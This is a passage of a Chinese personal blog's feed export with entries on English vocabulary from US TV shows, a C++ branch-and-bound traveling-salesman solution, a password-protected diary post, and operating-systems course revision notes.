        <content type="html"><![CDATA[<!--more--><h1 id="好想做一次"><a href="#好想做一次" class="headerlink" title="好想做一次"></a>好想做一次</h1><h3 id="2020-5-5-S1E1-3"><a href="#2020-5-5-S1E1-3" class="headerlink" title="2020.5.5 S1E1-3"></a>2020.5.5 S1E1-3</h3><h4 id="单词"><a href="#单词" class="headerlink" title="单词"></a>单词</h4><ol><li>popper n.上瘾的人<br>pill popper 瘾君子</li><li>hotheads n.暴脾气</li><li>unhinged adj.使精神失常（或错乱）</li><li>enlist v. 争取，谋取（帮助、支持或参与）、使）入伍；征募；从军</li><li>delve v.（在手提包、容器等中）翻找<br><font color="teal">delve into 探索；探究；查考</font></li><li></li></ol><h4 id="短语"><a href="#短语" class="headerlink" title="短语"></a>短语</h4><ol><li>knock it off 别想了，算了吧</li><li>stand up for yourself 捍卫自己</li><li>fly off the handle 失控</li><li>boil over 爆发</li><li>bring shame on a bird 怪罪于鸟</li><li>circle back about it 回头说哦</li></ol><h4 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h4>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 美剧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>摩登家庭</title>
      <link href="/2020/English/%E6%91%A9%E7%99%BB%E5%AE%B6%E5%BA%AD/"/>
      <url>/2020/English/%E6%91%A9%E7%99%BB%E5%AE%B6%E5%BA%AD/</url>
      
        <content type="html"><![CDATA[<!--more--><h1 id="摩登家庭"><a href="#摩登家庭" class="headerlink" title="摩登家庭"></a>摩登家庭</h1><h3 id="S1-2"><a href="#S1-2" class="headerlink" title="S1-2"></a>S1-2</h3><h4 id="单词"><a href="#单词" class="headerlink" title="单词"></a>单词</h4><ol><li>repress v.克制；压抑；抑制</li><li>debacle n.大败；崩溃；垮台；灾祸=&gt;阴影</li><li>undermine v.逐渐削弱（信心、权威等）；使逐步减少效力<br><font color="teal">undermine his confidence.</font></li><li>rudderless adj.无人管理的；无指导的；漫无目的的</li><li>trophy n. 奖品；战利品；纪念品</li><li>masterful adj.登峰造极的</li><li>commemorate v.纪念</li><li>truce n.休战</li><li>curvaceous adj.丰满的，富有曲线美</li><li>candor n.考验</li></ol><h4 id="短语"><a href="#短语" class="headerlink" title="短语"></a>短语</h4><ol><li>dredge up 重提，翻出（已遗忘的令人不快的往事）</li><li>pave the way (for sb/sth) （为…）铺平道路，创造条件</li><li>Just in the hood 恰巧路过</li><li>put the ducks in a row  有条不紊、一丝不苟</li><li>round out 丰富</li><li>off-putting adj.令人烦恼的；令人讨厌的</li></ol><h4 id="句子"><a href="#句子" class="headerlink" title="句子"></a>句子</h4><ol><li>Love knows no race,creed or gender.<br><font color="#536A71">爱情不分种族、信仰、性别。</font></li><li>it’s on calendar.<br><font color="#536A71">已经板上钉钉了</font></li><li>Somebody is full of herself.<br><font color="#536A71">有人自恋了</font></li><li>I’m about to embark on a new journey.<br><font color="#536a71">我的人生即将开始新的旅程</font></li><li>Give me a break.<br><font color="#536a71">饶过我吧</font></li><li>You had that bullet in the chamber.<br><font color="#536a71">你还留了一手</font></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 美剧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回溯法</title>
      <link href="/2020/ACM/%E5%9B%9E%E6%BA%AF%E6%B3%95/"/>
      <url>/2020/ACM/%E5%9B%9E%E6%BA%AF%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 回溯法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分支限界法</title>
      <link href="/2020/ACM/%E5%88%86%E6%94%AF%E9%99%90%E7%95%8C%E6%B3%95/"/>
      <url>/2020/ACM/%E5%88%86%E6%94%AF%E9%99%90%E7%95%8C%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>分支限界法</p><a id="more"></a><h2 id="分析题"><a href="#分析题" class="headerlink" title="分析题"></a>分析题</h2><h3 id="题干"><a href="#题干" class="headerlink" title="题干"></a>题干</h3><p>修改旅行商问题的分支限界法</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">Type</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">Traveling</span><span class="token punctuation">{</span>    <span class="token keyword">friend</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        Type <span class="token function">BBTSP</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span><span class="token operator">:</span>        <span class="token keyword">int</span> n<span class="token punctuation">,</span><span class="token operator">*</span>bestp<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//增加当前最优排列数组bestp</span>        Type <span class="token operator">*</span><span class="token operator">*</span>a<span class="token punctuation">,</span>NoEdge<span class="token punctuation">,</span>c<span class="token punctuation">,</span>bestc<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">template</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token class-name">Type</span><span class="token operator">></span>Type Traveling<span class="token operator">&lt;</span>Type<span class="token operator">></span><span class="token operator">::</span><span class="token function">BBTSP</span><span class="token punctuation">(</span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    MinHeap<span class="token operator">&lt;</span>MinHeapNode<span class="token operator">&lt;</span>Type<span class="token operator">></span> <span class="token operator">></span><span class="token function">H</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义最小堆容量为1000</span>    Type <span class="token operator">*</span>MinOut <span class="token operator">=</span> <span class="token keyword">new</span> Type <span class="token punctuation">[</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//计算MinOut[i]=顶点i的最小出边费用</span>    Type MinSum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        Type Min <span class="token operator">=</span> NoEdge<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> NoEdge <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span>Min <span class="token operator">||</span>Min <span class="token operator">==</span> NoEdge<span class="token punctuation">)</span><span class="token punctuation">)</span>                Min <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>Min <span class="token operator">==</span> NoEdge<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//无回路</span>            <span class="token keyword">return</span> NoEdge<span class="token punctuation">;</span>        MinOut<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> Min<span class="token punctuation">;</span>        MinSum <span class="token operator">+</span><span class="token operator">=</span> Min<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//初始化</span>    MinHeapNode<span class="token operator">&lt;</span>Type<span class="token operator">></span> E<span class="token punctuation">;</span>    E<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span> <span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    E<span class="token punctuation">.</span>s <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    E<span class="token punctuation">.</span>cc <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    E<span class="token punctuation">.</span>rcost <span class="token operator">=</span> MinSum<span class="token punctuation">;</span>    Type bestc <span class="token operator">=</span> NoEdge<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//搜索排列空间树</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>E<span class="token punctuation">.</span>s <span class="token operator">&lt;</span> n<span class="token number">-1</span> <span class="token operator">&amp;&amp;</span> E<span class="token punctuation">.</span>lcost<span class="token operator">&lt;</span> bestc<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>E<span class="token punctuation">.</span>s <span class="token operator">==</span> n<span class="token number">-2</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//如果当前有回路 且 费用小于当前最优解</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span>NoEdge <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span>NoEdge <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>E<span class="token punctuation">.</span>cc<span class="token operator">+</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>bestc <span class="token operator">||</span> bestc <span class="token operator">==</span> NoEdge<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                bestc <span class="token operator">=</span> E<span class="token punctuation">.</span>cc<span class="token operator">+</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>n<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                    bestp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//存储目前最优排列</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>                 <span class="token keyword">delete</span><span class="token punctuation">[</span><span class="token punctuation">]</span> E<span class="token punctuation">.</span>x <span class="token comment" spellcheck="true">//舍弃扩展节点</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> E<span class="token punctuation">.</span>s<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>E<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span>NoEdge<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//扩展可行的节点</span>                <span class="token punctuation">{</span>                    Type cc <span class="token operator">=</span> E<span class="token punctuation">.</span>cc<span class="token operator">+</span>a<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>E<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    Type rcost <span class="token operator">=</span> E<span class="token punctuation">.</span>rcost <span class="token operator">+</span> MinOut<span class="token punctuation">[</span>E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>E<span class="token punctuation">.</span>s<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    Type b <span class="token operator">=</span> cc <span class="token operator">+</span> rcost<span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>b<span class="token operator">&lt;</span>bestc <span class="token operator">||</span> bestc <span class="token operator">==</span> NoEdge<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//如果包含最优解</span>                    <span class="token punctuation">{</span>                        MinHeapNode<span class="token operator">&lt;</span>Type<span class="token operator">></span> N<span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span> <span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                            N<span class="token punctuation">.</span>x<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>x<span class="token punctuation">[</span>E<span class="token punctuation">.</span>s<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> E<span class="token punctuation">.</span>x<span class="token punctuation">[</span>E<span class="token punctuation">.</span>s<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>cc <span class="token operator">=</span> cc<span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>s <span class="token operator">=</span> E<span class="token punctuation">.</span>s<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>lcost <span class="token operator">=</span> b<span class="token punctuation">;</span>                        N<span class="token punctuation">.</span>rcost <span class="token operator">=</span> rcost<span class="token punctuation">;</span>                        H<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">delete</span><span class="token punctuation">[</span><span class="token punctuation">]</span> E<span class="token punctuation">.</span>x<span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">try</span><span class="token punctuation">{</span>                    H<span class="token punctuation">.</span><span class="token function">DeleteMin</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//取下一扩展节点</span>                <span class="token punctuation">}</span>                <span class="token keyword">catch</span><span class="token punctuation">(</span>OutOfBound<span class="token punctuation">)</span><span class="token punctuation">{</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//如果堆空，就退出</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>bestc <span class="token operator">==</span> NoEdge<span class="token punctuation">)</span>        <span class="token keyword">return</span> NoEdge<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        v<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> bestp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//释放所有节点</span>    <span class="token punctuation">{</span>        <span class="token keyword">delete</span><span class="token punctuation">[</span><span class="token punctuation">]</span> E<span class="token punctuation">.</span>x<span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>H<span class="token punctuation">.</span><span class="token function">DeleteMin</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span>OutOfBounds<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> bestc<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分支限界法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-5-4</title>
      <link href="/2020/diary/2020-5/2020-5-4/"/>
      <url>/2020/diary/2020-5/2020-5-4/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误！" data-whm="文章校验失败！"><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="请输入密码：" /><label>请输入密码：</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="21b6e363712f2648e0f46a410d7504b753ef2b708613c99ebb65edf350ef13dd">e32c27e47419b87d293b9e8ce412adf8d74b2f2577633cdca9b3c5a044e77a82096d626010c8f4c13fb7f41ace3790308ac5d62a0940504db81f63b77aa15cf61d5e703ffbbfc5a753634984ea5c0abc8c63558ec57f9f6318b8744c87598bda5db7eeb88662fa54717c657941f3b6e65f260276389c5b1a4e23f1de19214fdb312faa2300908d1ce8a237c086baace283e1e0f2a0ee3d5b990a6d1b39cfde091bf9c8781255fa898c6c326d9cb270a02fec97a8d5566b07a827ec05151a23ff9de6c89055816f74780dfaa4de53e30088a94c48babe0b27fed75a16a993fdb5bbc9978f2433de9653499b601227bd322a97cb64ad98fe96ae687b0da66666830371a0f67ebc7250776b8efb7d7ab1da12280d89a57ddcc4c856b17f011451c58f7612d9af0c13e032fe366bcf3885ee640c191bfe9289d6354babf991b94950a4ed85f0ee1daf5e9e53feec9d61b0af252e5aa86ef46ec644a12b041f49c1882ac107aa6a9f9273c133166601992dc3a620df582790ae63b8c2e58189e7b11155cd3fb8a793ff72cd62a73572eac2af9e49591a78dfe05966b2017ff94be121eec125cb1010b5fb8a2fccaf82fd38a7c133116f1a227f938d1f6238a850f6fa18477b2a69103097e123e2440dad8d6996d2f1a342886e66111b2a5e87f7d81b23d713500c6498809d552a85e03759d32d087e1e42ea7f7e9d79b6efc85e5907f1c6c7e648350e4b0f27436cd5124054a345d93f989053d3f6b1763de91ea03199fef0b9ba3f9041a544d84e5d38283c90ef5f98455da2ad7561a91b07248a2bb2f6d7648743643088ba7808fbc87347fffb3a87a9d857b3699791599e74c7c9d7b0e90cf63ddcc7279e8e26975b757072c3653fafee06754cbf7df42c43077c992559d023923df8c0e7e926d77b986c9456567fbd4b10561d5465739f01df4d5c412c8a06d615f2a9355acba3b9b134c3ab97e049cda2c588c8a7e91caadf0e899543b9b40d3cd4f55f0161d817929e766c75f2533f5fe4df9b6f3b9ed2f5a7b65829cd1b5e75c6ee6ab9c925e872af8aa4e349849c09d420df2192b2f72483f3a52a87259b64513869c8f55ef90972d71853c4f1a901819a55eea0471462fb4fde5418327e55b3ec3e16810038d87c940716ce16f798e04fa2565e4a25069c4d7dcdb24d0f13fc70636fdf9c437699a2c1ebbcd37fa22cac3ae13db8434c5e70034fa1ea3f8b023b4eccde6ac156e640ccbade048874eb69514b4ec342f50b0cd8e133713579ef7ce89a3321f270193888c688ad4db00f913d2d4c20b5346ebc054fba6675375416b5fd428b6c32d1e97efe787abf04ccd08e096ca4a04bbee7ce23992cef6ae80c0f408ce239d9863970f9f5b8fbc730f0f7b005941291220c059227e6259e2e31b5a1d47d8c73c68184bc37cc230936106e5437a3a32ea8507cfb154ff46150e017025141dc3b2c1b3e485e3bd50e22a517c4cd585048005d2c1010127556f6d96f3c4252fb7253ef390d51a03f062c3f7880c3c2c340bb85f6e066d7c42b7837da752a1eff3f2c4709a799309415d2f581f2bf3176a13dffce02d10259babee1ae9ce20555ada92fa4ecd41aa067d1ba0ec82b073bd68c2b01f7c96caed43980c0a21d7d6675b463a1fd193b84c3528c5a343d7bd59f7a5deb3e9d6fb10b3c576cc50ff802b57867de4fcf60a27970b161ae5cf1d8fb5ee1cc450de2f669e13ae4d541192ef14890c2768928e64c768d6737861390a686c15df7c4597c989a9db17dbd49edcf1981c4a90faa1d555b759ffdbe1a0303521842927c1936e7575e1bf66fa214713229853a7804b742fc5031f0f5e51c149ffb0e1887a36a24bc33f376a15ca905be3e3e00298d7be1dffd9ee4a7e071816377781b1dd21752848bdf720c0d536e8bf0813f1392f43574da08461d4f33cae780667051bb3679bc97e15271752052e44969c00a47563eb944a8b9b75e0a7f668d1a633815b02a2fc9d14cc6c491e45ceba38c95c564770f27058aca317e333e8c35ef043230e444710aae776fc148334204a8be3446d343bb3b77fdbcd0a4af6c299f96bc2dea1b97981c8f6759513f</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 杂思 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂思 </tag>
            
            <tag> 动漫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统原理</title>
      <link href="/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/"/>
      <url>/2020/learning/2019-2020s/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>东华大学操作系统原理课程重点<br>课程要求1-8章<br>重点内容是：第二章 进程的描述与控制、第三章 处理机调度与死锁、第四章 存储器管理、第五章 虚拟存储器。<br>这四章的内容在期末考试中占比达到80%。  </p><a id="more"></a>  <h2 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>硬件：中央处理器、内存储器、外存储器、输入设备、输出设备  </li><li>系统软件：操作系统、数据库管理系统、计算机编译语言、系统服务性程序  </li><li>应用软件：计算机源程序、应用软件包  </li><li>操作系统是一组(资源管理设备)。  </li><li>操作系统的五大类型：批处理操作系统、分时操作系统、实时操作系统、网络操作系统和分布式操作系统。  </li><li>对一般用户，通过<u>（操作命令）</u>方式控制操作系统；面对编程人员，通过<u>（系统调用）</u>控制。  </li><li>dos没有多道程序设计的特点。  </li><li>UNIX属于分时系统。  </li><li>在分时系统中，时间片一定，(用户数越多)，响应时间越长。  </li><li>操作系统中的作业管理是一种（宏观的高级管理）。  </li><li>系统调用的目的是请求系统服务。  </li><li>系统调用是由操作系统提供内部调用的，它(只能通过用户程序间接使用)。  </li><li>用户编写的程序与实际使用的物理设备无关，而由操作系统负责地址的重定位，我们称之为设备无关性。  </li></ol><h3 id="操作系统的目标"><a href="#操作系统的目标" class="headerlink" title="操作系统的目标"></a>操作系统的目标</h3><ol><li>有效性  </li><li>方便性  </li><li>可扩充性  </li><li>开放性  </li></ol><h3 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h3><ol><li>用户与硬件的借口  </li><li>系统资源管理者  <ul><li>处理机管理  </li><li>存储器管理  </li><li>I/O设备管理  </li><li>文件管理  </li></ul></li><li>实现了对计算机资源的抽象  </li></ol><h3 id="操作系统的发展"><a href="#操作系统的发展" class="headerlink" title="操作系统的发展"></a>操作系统的发展</h3><ol><li>无操作系统  </li><li><strong>批处理系统</strong>  <ul><li>优点：提高系统的使用率和吞吐量和效率  </li><li>缺点：无交互能力  </li></ul></li><li><strong>分时操作系统</strong>  <ul><li>特征：多路性、独立性、及时性、交互性  </li></ul></li><li><strong>实时操作系统</strong>  <ul><li>特征：实时性、可靠性、多路性、独立性、交互性  </li></ul></li><li>微机操作系统  </li><li>多处理机操作系统  </li><li><strong>网络操作系统</strong>  </li><li><strong>分布式操作系统</strong>  </li></ol><h3 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h3><ol><li>并发性  </li><li>共享性  </li><li>虚拟性  </li><li>异步性  </li></ol><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p>第二章 进程的描述与控制<br>第三章 处理机调度与死锁  </p><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><ol><li>进程：是资源分配和调度的独立单位  </li><li>线程：是系统独立调度和执行的基本单位  <ul><li>系统级线程  </li><li>用户级线程  </li></ul></li><li>临界资源：一段时间内只允许一个进程访问或使用的资源  </li><li>临界区：每个进程中访问临界资源的那段代码  </li><li>现代操作系统中为什么要引入“进程”概念？它与程序有什么区别？<br>可以并发执行的程序段之间，存在着某种相互制约的关系，它不仅要受到其它程序段活动的制约，而且还要依赖当时系统资源的分配情况。<br>只用“程序”这一概念就不能说明问题的木质。使用程序这一概念只能是简单、孤立、静止地研究分析它们，而不能深刻地揭示它们之间的内在活动、相互联系及状态变化。 从变化的角度，动态地分析研究这些可以并发执行的程序段，真实地反映出系统的独立性、并发性、动态性和相互制约性。应该用动态的观点来刻画程序。<br>进程是可并发执行的程序在一个数据集合上的运行过程，是系统进行资源分配和调度的一个独立单位。  